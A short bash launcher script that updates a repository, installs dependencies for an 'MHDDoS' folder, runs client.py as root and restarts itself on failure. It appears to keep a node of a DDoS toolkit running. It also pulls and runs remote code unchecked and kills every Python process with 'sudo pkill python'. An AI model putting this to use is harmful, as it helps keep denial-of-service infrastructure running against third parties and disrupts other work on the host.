#!/bin/bash

# Set the GitHub repository URL
GITHUB_REPO="https://github.com/botsarefuture/ns/"

# Navigate to the project directory
cd /root/ns/

# Check if Python is installed
if ! command -v python3 &> /dev/null; then
    echo "Installing Python 3..."
    # Add commands for installing Python based on your system (e.g., apt-get, yum, brew, etc.)
    # For example, on Debian/Ubuntu:
    sudo apt-get update -y
    sudo apt-get install python3 python-is-python3 python3-pip -y
fi

# Update the repository
git pull origin master

# Install or update Python packages
python3 -m pip install --upgrade -r mhddos/MHDDoS/requirements.txt

sudo pkill python

# Run the client script
python3 client.py

# Check the exit status of the script
if [ $? -eq 0 ]; then
    echo "Script completed successfully."
else
    echo "Script failed. Restarting..."
    # Run the script again to attempt a restart
    exec bash auto_update_and_restart.sh
fi
